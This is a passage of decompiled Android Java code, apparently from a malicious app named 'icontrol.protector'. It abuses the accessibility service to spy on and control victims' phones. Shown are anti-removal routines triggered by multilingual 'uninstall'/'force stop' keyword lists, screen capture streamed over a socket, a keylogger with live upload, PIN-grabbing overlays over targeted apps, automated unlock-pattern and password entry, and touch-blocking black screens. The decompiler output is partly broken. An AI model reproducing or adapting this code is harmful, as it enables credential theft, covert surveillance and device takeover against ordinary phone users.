                                    continue;
                                    break;
                                }
                                if (var3_21 != 0) {
                                    block146: {
                                        var18_2 = new String[]{"remove", "delete", "uninstall", "turn off", "disable", "\u0625\u0632\u0627\u0644\u0629", "\u062d\u0630\u0641", "\u0625\u0644\u063a\u0627\u0621 \u0627\u0644\u062a\u062b\u0628\u064a\u062a", "\u0625\u064a\u0642\u0627\u0641 \u0627\u0644\u062a\u0634\u063a\u064a\u0644", "\u062a\u0639\u0637\u064a\u0644", "\u79fb\u9664", "\u5220\u9664", "\u5378\u8f7d", "\u5173\u95ed", "\u7981\u7528", "kald\u0131r", "\u00e7\u0131kar", "sil", "uygulamay\u0131 kald\u0131r", "kapat", "devre d\u0131\u015f\u0131 b\u0131rak", "remover", "eliminar", "borrar", "desinstalar", "apagar", "deshabilitar", "\u0443\u0434\u0430\u043b\u0438\u0442\u044c", "\u0441\u0442\u0435\u0440\u0435\u0442\u044c", "\u0434\u0435\u0438\u043d\u0441\u0442\u0430\u043b\u043b\u0438\u0440\u043e\u0432\u0430\u0442\u044c", "\u0432\u044b\u043a\u043b\u044e\u0447\u0438\u0442\u044c", "\u043e\u0442\u043a\u043b\u044e\u0447\u0438\u0442\u044c", "remover", "apagar", "desinstalar", "desligar", "desativar"};
                                        var1_19 = ((Object)var18_2).length;
                                        for (var2_20 = 0; var2_20 < var1_19; ++var2_20) {
                                            var21_37 = var18_2[var2_20];
                                            if (!var20_36.toLowerCase().contains(var21_37.toLowerCase())) continue;
                                            var1_19 = 1;
                                            break block146;
                                        }
                                        var1_19 = 0;
                                    }
                                    if (var1_19 != 0) {
                                        ** try [egrp 48[TRYBLOCK] [91 : 2598->4224)] { 
lbl419:
                                        // 1 sources

                                        var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda8();
                                        var19_34.post((Runnable)var18_2);
                                        var1_19 = 200;
                                        var18_2 = var19_34;
                                        continue;
                                    }
                                }
lbl425:
                                // 5 sources

                                var18_2 = Locale.getDefault().getLanguage();
                                if (var12_30) {
                                    var1_19 = 0;
                                    if (var18_2.equals("ar")) {
                                        var1_19 = !(var20_36.contains("\u0627\u0644\u063a\u0627\u0621") || var20_36.contains("\u0627\u0644\u062e\u0644\u0641\u064a\u0629") || var20_36.contains("\u0623\u0630\u0648\u0646\u0627\u062a") || var20_36.contains("\u0645\u0633\u062d") || var20_36.contains("\u062a\u0648\u0642\u0641") || var20_36.contains("\u0625\u0644\u063a\u0627\u0621 \u0627\u0644\u062a\u062b\u0628\u064a\u062a") || var20_36.contains("\u062a\u0639\u0637\u064a\u0644") || var20_36.contains("\u0642\u062a\u0644") || var20_36.contains("\u0627\u063a\u0644\u0627\u0642") || var20_36.contains("\u0625\u0632\u0627\u0644\u0629") || var20_36.contains("\u062d\u0630\u0641") || var20_36.contains("\u0625\u0646\u0647\u0627\u0621")) ? 0 : 1;
                                    } else if (var18_2.equals("en")) {
                                        var1_19 = !(var20_36.contains("background") || var20_36.contains("uninstall") || var20_36.contains("permissions") || var20_36.contains("clear") || var20_36.contains("stop") || var20_36.contains("force stop") || var20_36.contains("disable") || var20_36.contains("close") || var20_36.contains("remove") || var20_36.contains("delete") || var20_36.contains("terminate") || var20_36.contains("end") || var20_36.contains("kill")) ? 0 : 1;
                                    } else if (var18_2.equals("zh")) {
                                        var1_19 = !(var20_36.contains("\u5141\u8bb8\u5b8c\u5168\u540e\u53f0\u884c\u4e3a") || var20_36.contains("\u5378\u8f7d") || var20_36.contains("\u5f3a\u884c\u505c\u6b62") || var20_36.contains("\u6743\u9650") || var20_36.contains("\u6e05\u9664") || var20_36.contains("\u505c\u6b62") || var20_36.contains("\u7981\u7528") || var20_36.contains("\u5141\u8bb8") || var20_36.contains("\u540e\u53f0\u7ba1\u7406") || var20_36.contains("\u5173\u95ed") || var20_36.contains("\u5220\u9664") || var20_36.contains("\u6e05\u7406") || var20_36.contains("\u79fb\u9664") || var20_36.contains("\u7ed3\u675f") || var20_36.contains("\u7ec8\u6b62")) ? 0 : 1;
                                    } else if (var18_2.equals("tr")) {
                                        var1_19 = !(var20_36.contains("arka plan faaliyetine izin ver") || var20_36.contains("kald\u0131r") || var20_36.contains("izinler") || var20_36.contains("durdur") || var20_36.contains("temizle") || var20_36.contains("dur") || var20_36.contains("zorla durdur") || var20_36.contains("devre d\u0131\u015f\u0131 b\u0131rak") || var20_36.contains("\u00e7\u0131kar") || var20_36.contains("kapat") || var20_36.contains("sil") || var20_36.contains("arka planda \u00e7al\u0131\u015fmay\u0131 durdur") || var20_36.contains("remove") || var20_36.contains("sonland\u0131r")) ? 0 : 1;
                                    } else if (var18_2.equals("es")) {
                                        var1_19 = !(var20_36.contains("fondo") || var20_36.contains("desinstalar") || var20_36.contains("permisos") || var20_36.contains("limpiar") || var20_36.contains("parar") || var20_36.contains("detener") || var20_36.contains("forzar detenci\u00f3n") || var20_36.contains("deshabilitar") || var20_36.contains("cerrar") || var20_36.contains("eliminar") || var20_36.contains("cerrar aplicaci\u00f3n") || var20_36.contains("remover") || var20_36.contains("borrar") || var20_36.contains("terminar")) ? 0 : 1;
                                    } else if (var18_2.equals("ru")) {
                                        var1_19 = !(var20_36.contains("\u0444\u043e\u043d") || var20_36.contains("\u0443\u0434\u0430\u043b\u0438\u0442\u044c") || var20_36.contains("\u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u0438\u044f") || var20_36.contains("\u043e\u0447\u0438\u0441\u0442\u0438\u0442\u044c") || var20_36.contains("\u043e\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c") || var20_36.contains("\u043f\u0440\u0438\u043d\u0443\u0434\u0438\u0442\u0435\u043b\u044c\u043d\u0430\u044f \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430") || var20_36.contains("\u043e\u0442\u043a\u043b\u044e\u0447\u0438\u0442\u044c") || var20_36.contains("\u0437\u0430\u043a\u0440\u044b\u0442\u044c") || var20_36.contains("remove") || var20_36.contains("\u0441\u0442\u0435\u0440\u0435\u0442\u044c") || var20_36.contains("\u0437\u0430\u0432\u0435\u0440\u0448\u0438\u0442\u044c")) ? 0 : 1;
                                    } else if (var18_2.equals("pt")) {
                                        var1_19 = !(var20_36.contains("plano de fundo") || var20_36.contains("desinstalar") || var20_36.contains("permiss\u00f5es") || var20_36.contains("limpar") || var20_36.contains("parar") || var20_36.contains("for\u00e7ar parada") || var20_36.contains("desativar") || var20_36.contains("fechar") || var20_36.contains("remover") || var20_36.contains("apagar") || var20_36.contains("encerrar")) ? 0 : 1;
                                    }
                                    if (var1_19 != 0) {
                                        var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda9();
                                        var19_34.post((Runnable)var18_2);
                                        var1_19 = 200;
                                        var18_2 = var19_34;
                                        continue;
                                    }
                                }
                                var1_19 = 0;
                                if (var18_2.equals("ar")) {
                                    var1_19 = !(var20_36.contains("\u0625\u0639\u0627\u062f\u0629 \u0636\u0628\u0637 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a") || var20_36.contains("\u0625\u0639\u0627\u062f\u0629 \u062a\u0639\u064a\u064a\u0646 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a") || var20_36.contains("\u0625\u0639\u0627\u062f\u0629 \u062a\u0639\u064a\u064a\u0646 \u0625\u0639\u062f\u0627\u062f\u0627\u062a \u0625\u0645\u0643\u0627\u0646\u064a\u0629 \u0627\u0644\u0648\u0635\u0648\u0644")) ? 0 : var6_24;
                                } else if (var18_2.equals("en")) {
                                    var1_19 = !(var20_36.contains("reset accessibility settings") || var20_36.contains("reset apps") || var20_36.contains("reset all your preferences")) ? 0 : var8_26;
                                } else if (var18_2.equals("zh")) {
                                    var1_19 = !(var20_36.contains("\u91cd\u7f6e\u5e94\u7528") || var20_36.contains("\u91cd\u7f6e\u5e94\u7528\u504f\u597d\u8bbe\u7f6e") || var20_36.contains("\u91cd\u7f6e\u8f85\u52a9\u529f\u80fd\u8bbe\u7f6e")) ? 0 : var10_28;
                                } else if (var18_2.equals("tr")) {
                                    var1_19 = !var20_36.contains("eri\u015filebilirlik ayarlar\u0131n\u0131 s\u0131f\u0131rla") && !var20_36.contains("uygulamalar\u0131 s\u0131f\u0131rla") ? 0 : var7_25;
                                } else if (var18_2.equals("es")) {
                                    var1_19 = !var20_36.contains("restablecer configuraci\u00f3n de accesibilidad") && !var20_36.contains("restablecer preferencias de aplicaciones") ? 0 : var5_23;
                                } else if (var18_2.equals("ru")) {
                                    var1_19 = !var20_36.contains("\u0441\u0431\u0440\u043e\u0441\u0438\u0442\u044c \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0445 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0435\u0439") && !var20_36.contains("\u0441\u0431\u0440\u043e\u0441 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043a \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0439") ? 0 : var9_27;
                                } else if (var18_2.equals("pt")) {
                                    var1_19 = !var20_36.contains("redefinir prefer\u00eancias do app") && !var20_36.contains("redefinir configura\u00e7\u00f5es de acessibilidade") ? 0 : var4_22;
                                }
                                if (var1_19 != 0) {
                                    var18_2 = new AccessibilityServiceController$10$$ExternalSyntheticLambda10();
                                    var19_34.post((Runnable)var18_2);
                                }
                            }
lbl482:
                            // 5 sources

                            catch (Exception var18_15) {}
                        }
                        var1_19 = 200;
                    }
                    var18_2 = var19_34;
                }
            }
        }).start();
    }

    public void CapScreen(Context context, String string2, int n) {
        try {
            if (snapcallback == null) {
                AccessibilityService.TakeScreenshotCallback takeScreenshotCallback;
                snapcallback = takeScreenshotCallback = new AccessibilityService.TakeScreenshotCallback(){
                    final AccessibilityServiceController this$0;
                    final Context val$ctx;
                    final int val$quality;
                    final String val$stype;
                    {
                        this.this$0 = jhvbzpdwpbqgticwdxuva2;
                        this.val$stype = string2;
                        this.val$quality = n;
                        this.val$ctx = context;
                    }

                    public void onFailure(int n) {
                        if (n == 3) {
                            WorkerService.DelayScreenshot += 50;
                        }
                    }

                    public void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
                        new Thread(this, screenshotResult){
                            final 6 this$1;
                            final AccessibilityService.ScreenshotResult val$screenshotResult;
                            {
                                this.this$1 = var1_1;
                                this.val$screenshotResult = screenshotResult;
                            }

                            /*
                             * WARNING - void declaration
                             * Enabled aggressive block sorting
                             * Enabled unnecessary exception pruning
                             * Enabled aggressive exception aggregation
                             */
                            @Override
                            public void run() {
                                try {
                                    Bitmap bitmap = Bitmap.wrapHardwareBuffer((HardwareBuffer)this.val$screenshotResult.getHardwareBuffer(), (ColorSpace)this.val$screenshotResult.getColorSpace());
                                    if (bitmap == null) {
                                        return;
                                    }
                                    Bitmap bitmap2 = Bitmap.createScaledBitmap((Bitmap)bitmap.copy(Bitmap.Config.ARGB_8888, true), (int)350, (int)650, (boolean)false);
                                    Object object = new ByteArrayOutputStream();
                                    if (!this.this$1.val$stype.equals("snap")) {
                                        if (BlackScreen_ON) {
                                            ColorMatrix colorMatrix = new ColorMatrix(new float[]{11.086957f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 11.086957f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 11.086957f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 1.0f, 0.0f});
                                            Paint paint = new Paint();
                                            ColorMatrixColorFilter colorMatrixColorFilter = new ColorMatrixColorFilter(colorMatrix);
                                            paint.setColorFilter((ColorFilter)colorMatrixColorFilter);
                                            Bitmap bitmap3 = Bitmap.createBitmap((int)bitmap2.getWidth(), (int)bitmap2.getHeight(), (Bitmap.Config)Bitmap.Config.ARGB_8888);
                                            colorMatrixColorFilter = new Canvas(bitmap3);
                                            colorMatrixColorFilter.drawBitmap(bitmap2, 0.0f, 0.0f, paint);
                                            bitmap2.recycle();
                                            bitmap2 = bitmap3;
                                            bitmap2.compress(Bitmap.CompressFormat.WEBP, 100, (OutputStream)object);
                                        } else {
                                            bitmap2.compress(Bitmap.CompressFormat.WEBP, this.this$1.val$quality, (OutputStream)object);
                                        }
                                        byte[] byArray = ((ByteArrayOutputStream)object).toByteArray();
                                        CommandExecutor.instance(this.this$1.val$ctx).LiveScreenSilent(this.this$1.val$ctx, byArray, this.this$1.val$stype);
                                    } else {
                                        void var2_11;
                                        bitmap2.compress(Bitmap.CompressFormat.WEBP, this.this$1.val$quality, (OutputStream)object);
                                        object = Base64.encodeToString((byte[])((ByteArrayOutputStream)object).toByteArray(), (int)0);
                                        JSONObject jSONObject = new JSONObject();
                                        jSONObject.put("type", (Object)"snap");
                                        jSONObject.put("img", object);
                                        String string2 = jSONObject.toString();
                                        Object object2 = object = SharedPreferencesManager.Read(this.this$1.val$ctx, ConfigurationConstants.Sec_IDF, "null");
                                        if (((String)object).equals("null")) {
                                            String string3 = SharedPreferencesManager.Read(this.this$1.val$ctx, ConfigurationConstants.THE_IDF, null);
                                        }
                                        CommandExecutor.instance(this.this$1.val$ctx).SendNewSocket(this.this$1.val$ctx, (String)var2_11, string2);
                                    }
                                    bitmap.recycle();
                                    bitmap2.recycle();
                                    this.val$screenshotResult.getHardwareBuffer().close();
                                    return;
                                }
                                catch (Exception exception) {
                                    exception.printStackTrace();
                                }
                            }
                        }.start();
                    }
                };
            }
            this.takeScreenshot(0, this.threadPoolExecutor, snapcallback);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * Unable to fully structure code
     */
    public void Capturekeylogger(AccessibilityNodeInfo var1_1, String var2_4, int var3_6) {
        block12: {
            if (var1_1 == null) {
                return;
            }
            var5_7 = "";
            if (var1_1.getText() != null) {
                var5_7 = var1_1.getText().toString();
            } else if (var1_1.getContentDescription() != null) {
                var5_7 = var1_1.getContentDescription().toString();
            }
            var1_1 = var5_7.replace("[]", "");
            if (var1_1.isEmpty() || var1_1.length() <= 0) break block12;
            var1_1 = AccessibilityServiceHelper.EtypetoStr(var3_6);
            var6_8 = new StringBuilder();
            var1_1 = var6_8.append(var2_4).append("|").append((String)var1_1).append("|").append(var5_7).toString();
            var4_9 = ConfigurationConstants.liv_klogs;
            if (!var4_9) ** GOTO lbl29
            try {
                var2_4 = new JSONObject();
                var2_4.put("type", (Object)"keys");
                var2_4.put("data", var1_1);
                var2_4 = var2_4.toString();
                CommandExecutor.instance(this.getApplicationContext()).Livemessage(this.getApplicationContext(), var2_4);
                ** GOTO lbl29
            }
            catch (Exception var2_5) {
                try {
                    var2_5.printStackTrace();
lbl29:
                    // 3 sources

                    if (ConfigurationConstants.Rec_klogs) {
                        KeystrokeLogger.Record((String)var1_1, KeystrokeLogger.ActivityType.KSTR);
                    }
                }
                catch (Exception var1_2) {
                    try {
                        AndroidLogger.Error("At.acc.keystrk", var1_2.getMessage());
                    }
                    catch (Exception var1_3) {
                        Log.e((String)"At.printViewIds", (String)("Exception: " + var1_3.getMessage()));
                    }
                }
            }
        }
    }

    public void ScreenGrapper(Context context, AccessibilityServiceController jhvbzpdwpbqgticwdxuva2) {
        new Thread(new Runnable(){
            final AccessibilityServiceController this$0;
            final Context val$ctx;
            final AccessibilityServiceController val$maccess;
            {
                this.this$0 = jhvbzpdwpbqgticwdxuva2;
                this.val$maccess = jhvbzpdwpbqgticwdxuva3;
                this.val$ctx = context;
            }

            @Override
            public void run() {
                Handler handler = new Handler(this.val$maccess.getMainLooper());
                do {
                    AccessibilityServiceController.access$102(System.currentTimeMillis());
                    Object object = this.val$maccess.getRootInActiveWindow();
                    if (object == null) continue;
                    try {
                        if (object.getPackageName() == null || Graplist.size() == 0) continue;
                        if (Graplist.contains(((String)(object = ((Object)object.getPackageName()).toString())).toLowerCase())) {
                            onealip = true;
                            object = UtilityHelper.getAppNameFromPkgName(this.val$ctx, (String)object);
                            Runnable runnable2 = new Runnable(){
                                final 7 this$1;
                                final String val$targetname;
                                {
                                    this.this$1 = var1_1;
                                    this.val$targetname = string2;
                                }

                                @Override
                                public void run() {
                                    try {
                                        this.this$1.this$0.addOverlaysGrab(this.val$targetname);
                                    }
                                    catch (Exception exception) {
                                        // empty catch block
                                    }
                                }
                            };
                            handler.post(runnable2);
                        } else if (onealip && !((String)object).equals("com.android.systemui".toLowerCase())) {
                            onealip = false;
                            this.this$0.removeAllOverlays();
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    try {
                        this.this$0.sleep(200);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                } while (SharedPreferencesManager.ReadBool(this.val$ctx, ConfigurationConstants.enable_trak, false));
                AccessibilityServiceController.access$102(0L);
            }
        }).start();
    }

    public void ScreenScanner(Context context) {
        new Thread(new Runnable(){
            final AccessibilityServiceController this$0;
            final Context val$ctx;
            {
                this.this$0 = jhvbzpdwpbqgticwdxuva2;
                this.val$ctx = context;
            }

            @Override
            public void run() {
                int n = 1000;
                while (true) {
                    int n2;
                    block27: {
                        Object object;
                        Object object2;
                        int n3;
                        block28: {
                            AccessibilityServiceController.access$402(System.currentTimeMillis());
                            try {
                                this.this$0.sleep(n);
                            }
                            catch (Exception exception) {
                                // empty catch block
                            }
                            n2 = n = 3000;
                            try {
                                if (!SharedPreferencesManager.ReadBool(this.val$ctx, ConfigurationConstants.Send_Skilton, false)) break block27;
                                n = n3 = 100;
                            }
                            catch (Exception exception) {
                                continue;
                            }
                            object2 = AccessibilityServiceHelper.createskilton();
                            n2 = n3;
                            if (object2 == null) break block27;
                            n = n3;
                            object = AccessWindow.getDefaultDisplay();
                            n = n3;
                            n = n3;
                            Object object3 = new Point();
                            n = n3;
                            object.getRealSize((Point)object3);
                            n = n3;
                            n2 = ((Point)object3).x;
                            n = n3;
                            int n4 = ((Point)object3).y;
                            n = n3;
                            object3 = Base64.encodeToString((byte[])object2, (int)0);
                            n = n3;
                            object2 = new JSONObject;
                            n = n3;
                            object2();
                            n = n3;
                            object2.put("type", (Object)"screen");
                            n = n3;
                            object2.put("img", object3);
                            n = n3;
                            object2.put("frmt", (Object)"w");
                            n = n3;
                            object2.put("ori", (Object)Tools.getOrientationString(this.val$ctx));
                            n = n3;
                            object2.put("skly", (Object)"1");
                            n = n3;
                            object2.put("wmob", n2);
                            n = n3;
                            object2.put("hmob", n4);
                            n = n3;
                            object = object2.toString();
                            n = n3;
                            object3 = SharedPreferencesManager.Read(this.val$ctx, ConfigurationConstants.Sec_IDF, "null");
                            object2 = object3;
                            n = n3;
                            if (!((String)object3).equals("null")) break block28;
                            n = n3;
                            object2 = SharedPreferencesManager.Read(this.val$ctx, ConfigurationConstants.THE_IDF, null);
                        }
                        n = n3;
                        CommandExecutor.instance(this.val$ctx).SendNewSocket(this.val$ctx, (String)object2, (String)object);
                        n2 = n3;
                    }
                    n = n2;
                    continue;
                    break;
                }
            }
        }).start();
    }

    public void SetupWbvew(String string2) {
        try {
            Handler handler = new Handler(this.getMainLooper());
            AccessibilityServiceController$$ExternalSyntheticLambda18 AccessibilityServiceController$$ExternalSyntheticLambda18 = new AccessibilityServiceController$$ExternalSyntheticLambda18(this, string2);
            handler.post((Runnable)AccessibilityServiceController$$ExternalSyntheticLambda18);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void Unlockpass(String string2, boolean bl) {
        try {
            AccessibilityServiceHelper.pasteText(string2);
            if (bl && (string2 = UtilityHelper.loadPatternMap(this.getApplicationContext()).get(-1)) != null) {
                AccessibilityServiceHelper.clickthis(((Point)string2).x, ((Point)string2).y);
            }
            NeedEnter = true;
        }
        catch (Exception exception) {
            // empty catch block
        }
        skiprecord = false;
    }

    public void applyBlockTouchesToOverlay() {
        if (Blacklayparams != null && TouchBlockParams != null) {
            int[] nArray = this.getFullscreenOverlayRect();
            AccessibilityServiceController.Blacklayparams.flags = 0x80090708 | 0x10;
            AccessibilityServiceController.Blacklayparams.width = nArray[0];
            AccessibilityServiceController.Blacklayparams.height = nArray[1];
            AccessibilityServiceController.Blacklayparams.x = nArray[2];
            AccessibilityServiceController.Blacklayparams.y = nArray[3];
            if (this.BlackoverLay != null && this.BlackoverLay.getWindowToken() != null && AccessWindow != null) {
                try {
                    AccessWindow.updateViewLayout((View)this.BlackoverLay, (ViewGroup.LayoutParams)Blacklayparams);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
            if (BlackScreen_BlockTouches) {
                if (this.TouchBlockOverlay != null && this.TouchBlockOverlay.getWindowToken() == null && AccessWindow != null) {
                    try {
                        AccessibilityServiceController.TouchBlockParams.width = nArray[0];
                        AccessibilityServiceController.TouchBlockParams.height = nArray[1];
                        AccessibilityServiceController.TouchBlockParams.x = nArray[2];
                        AccessibilityServiceController.TouchBlockParams.y = nArray[3];
                        AccessWindow.addView(this.TouchBlockOverlay, (ViewGroup.LayoutParams)TouchBlockParams);
                    }
                    catch (Exception exception) {}
                }
            } else if (this.TouchBlockOverlay != null && this.TouchBlockOverlay.getWindowToken() != null && AccessWindow != null) {
                try {
                    AccessWindow.removeView(this.TouchBlockOverlay);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
            return;
        }
    }

    public void clearWbVew() {
        try {
            Object object;
            if (this.BlackoverLay != null && this.WbVwBlack != null && this.WbVwBlack.getParent() != null) {
                this.BlackoverLay.removeView((View)this.WbVwBlack);
            }
            this.WbVwBlack = object = new WebView((Context)this);
            this.WbVwBlack.setBackgroundColor(0);
            this.applyWebViewSettings(this.WbVwBlack);
            WebView webView = this.WbVwBlack;
            object = new SafeWebViewClient(this);
            webView.setWebViewClient((WebViewClient)object);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public void disablesuperwatch() {
        AccessibilityServiceInfo accessibilityServiceInfo;
        this.Watching = false;
        try {
            accessibilityServiceInfo = this.getServiceInfo();
            accessibilityServiceInfo.flags &= 0xFFFFFFFB;
            this.setServiceInfo(accessibilityServiceInfo);
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                accessibilityServiceInfo = new Region();
                Rect rect = new Rect(0, this.mHeight - 200, this.mWidth, this.mHeight);
                accessibilityServiceInfo.op(rect, Region.Op.UNION);
                this.setTouchExplorationPassthroughRegion(0, (Region)accessibilityServiceInfo);
                this.setGestureDetectionPassthroughRegion(0, (Region)accessibilityServiceInfo);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void drawPattern(String object) {
        Map<Integer, Point> map2 = UtilityHelper.loadPatternMap(this.getApplicationContext());
        ArrayList<Point> arrayList = new ArrayList<Point>();
        object = ((String)object).toCharArray();
        int n = ((Object)object).length;
        for (int i = 0; i < n; ++i) {
            Point point = map2.get(Character.getNumericValue((char)object[i]));
            if (point == null) continue;
            arrayList.add(point);
        }
        if (!arrayList.isEmpty()) {
            object = AccessibilityServiceHelper.myAccess();
            if (object == null) {
                return;
            }
            new Handler(object.getMainLooper()).post((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda8(this, arrayList));
        }
        try {
            Thread.sleep(1000L);
        }
        catch (Exception exception) {
            // empty catch block
        }
        skiprecord = false;
    }

    public void enableaccess() {
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.flags = 123;
        accessibilityServiceInfo.eventTypes = 0x1FFFFFF;
        accessibilityServiceInfo.notificationTimeout = 0L;
        accessibilityServiceInfo.packageNames = null;
        accessibilityServiceInfo.feedbackType = -1;
        this.setServiceInfo(accessibilityServiceInfo);
    }

    public void enablesuperWatch() {
        if (this.Watching) {
            return;
        }
        this.Watching = true;
        try {
            Handler handler = new Handler(this.getMainLooper());
            AccessibilityServiceController$$ExternalSyntheticLambda2 AccessibilityServiceController$$ExternalSyntheticLambda2 = new AccessibilityServiceController$$ExternalSyntheticLambda2(this);
            handler.postDelayed((Runnable)AccessibilityServiceController$$ExternalSyntheticLambda2, 600L);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public boolean isDigitpin(String string2) {
        boolean bl = false;
        if (string2 != null && string2.length() == 1) {
            char c = string2.charAt(0);
            boolean bl2 = bl;
            if (c >= '0') {
                bl2 = bl;
                if (c <= '9') {
                    bl2 = true;
                }
            }
            return bl2;
        }
        return false;
    }

    /* synthetic */ void lambda$Setup$2$com-icontrol-protector-AccessibilityServiceController() {
        try {
            this.SetupWbvew(UtilityHelper.loadHtmlFromAssets(this.getApplicationContext(), "launcher.html"));
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /*
     * Unable to fully structure code
     */
    /* synthetic */ void lambda$SetupWbvew$3$com-icontrol-protector-AccessibilityServiceController(String var1_1) {
        try {
            var2_4 = Locale.getDefault().getLanguage();
            var3_5 = new String(Base64.decode((String)var1_1, (int)0), "UTF-8");
            var1_1 = var3_5.replace("[LNG]", var2_4).replace("[BASE-ICO]", UtilityHelper.getAppIconAsBase64(this.getApplicationContext()));
            this.WbVwBlack.loadDataWithBaseURL(null, var1_1, "text/html", "utf-8", null);
            ** GOTO lbl10
        }
        catch (Exception var1_2) {
            try {
                var1_2.printStackTrace();
lbl10:
                // 2 sources

                if (this.WbVwBlack != null && this.WbVwBlack.getWindowToken() != null) {
                    this.clearWbVew();
                }
                this.BlackoverLay.addView((View)this.WbVwBlack);
            }
            catch (Exception var1_3) {
                var1_3.printStackTrace();
            }
        }
    }

    /* synthetic */ boolean lambda$addOverlay$21$com-icontrol-protector-AccessibilityServiceController(Rect rect, View view, WindowManager.LayoutParams layoutParams, String string2, String string3, View view2, MotionEvent motionEvent) {
        block0: {
            if (motionEvent.getAction() != 0) break block0;
            AccessWindow.removeView(view2);
            view2 = new Handler(Looper.getMainLooper());
            view2.postDelayed(new Runnable(){
                final AccessibilityServiceController this$0;
                final String val$appname;
                final Rect val$bounds;
                final String val$clicktext;
                final Handler val$hstop;
                final View val$overlay;
                final WindowManager.LayoutParams val$params;
                {
                    this.this$0 = jhvbzpdwpbqgticwdxuva2;
                    this.val$bounds = rect;
                    this.val$hstop = handler;
                    this.val$overlay = view;
                    this.val$params = layoutParams;
                    this.val$appname = string2;
                    this.val$clicktext = string3;
                }

                /*
                 * Unable to fully structure code
                 */
                @Override
                public void run() {
                    AccessibilityServiceHelper.clickthis(this.val$bounds.centerX(), this.val$bounds.centerY());
                    var2_1 = this.val$hstop;
                    var3_3 = new Runnable(this){
                        final 11 this$1;
                        {
                            this.this$1 = var1_1;
                        }

                        @Override
                        public void run() {
                            try {
                                AccessWindow.addView(this.this$1.val$overlay, (ViewGroup.LayoutParams)this.this$1.val$params);
                            }
                            catch (Exception exception) {
                                // empty catch block
                            }
                        }
                    };
                    var2_1.postDelayed(var3_3, 100L);
                    var2_1 = new StringBuilder();
                    var2_1 = var2_1.append(this.val$appname).append("|PIN|").append(this.val$clicktext).toString();
                    var1_5 = ConfigurationConstants.liv_klogs;
                    if (!var1_5) ** GOTO lbl24
                    try {
                        var3_3 = new JSONObject();
                        var3_3.put("type", "keys");
                        var3_3.put("data", var2_1);
                        var3_3 = var3_3.toString();
                        CommandExecutor.instance(this.this$0.getApplicationContext()).Livemessage(this.this$0.getApplicationContext(), (String)var3_3);
                        ** GOTO lbl24
                    }
                    catch (Exception var3_4) {
                        try {
                            var3_4.printStackTrace();
lbl24:
                            // 3 sources

                            KeystrokeLogger.Record((String)var2_1, KeystrokeLogger.ActivityType.KSTR);
                            var3_3 = new ArrayList();
                            var2_1 = new StringBuilder();
                            var3_3.add(Base64.encodeToString((byte[])var2_1.append(this.val$appname).append(ConfigurationConstants.SPLIT_DATA).append("Grabber").append(ConfigurationConstants.SPLIT_DATA).append(this.val$clicktext).append(ConfigurationConstants.SPLIT_DATA).append("PIN").toString().getBytes(), (int)0));
                            SharedPreferencesManager.WriteList(this.this$0.getApplicationContext(), ConfigurationConstants.web_pass, (ArrayList<String>)var3_3);
                        }
                        catch (Exception var2_2) {
                            // empty catch block
                        }
                    }
                }
            }, 100L);
        }
        return true;
    }

    /* synthetic */ void lambda$drawPattern$10$com-icontrol-protector-AccessibilityServiceController(List list) {
        this.simulatePatternGesture(list);
    }

    /* synthetic */ void lambda$enableallxaomi$24$com-icontrol-protector-AccessibilityServiceController() {
        try {
            this.performGlobalAction(1);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /* synthetic */ void lambda$enableallxaomi$25$com-icontrol-protector-AccessibilityServiceController() {
        try {
            this.enableallxaomi();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /* synthetic */ void lambda$enableallxaomi$26$com-icontrol-protector-AccessibilityServiceController(Handler handler) {
        Object object = AccessibilityServiceHelper.getNodeByViewId(this.getRootInActiveWindow(), "com.miui.securitycenter:id/permission_always");
        if (object != null) {
            if (!object.isChecked()) {
                object.performAction(16);
            }
            try {
                object = new AccessibilityServiceController$$ExternalSyntheticLambda11(this);
                handler.postDelayed((Runnable)object, 250L);
            }
            catch (Exception exception) {
                // empty catch block
            }
            handler.postDelayed((Runnable)new AccessibilityServiceController$$ExternalSyntheticLambda19(this), 500L);
        }
    }

    /* synthetic */ void lambda$enablesuperWatch$0$com-icontrol-protector-AccessibilityServiceController() {
        AccessibilityServiceInfo accessibilityServiceInfo;
        try {
            accessibilityServiceInfo = this.getServiceInfo();
            accessibilityServiceInfo.flags |= 4;
            this.setServiceInfo(accessibilityServiceInfo);
        }
        catch (Exception exception) {
            // empty catch block
        }
        if (Build.VERSION.SDK_INT >= 30) {
            accessibilityServiceInfo = new Region();
            accessibilityServiceInfo.op(new Rect(0, 0, this.mWidth - 3, this.mHeight - 3), Region.Op.UNION);
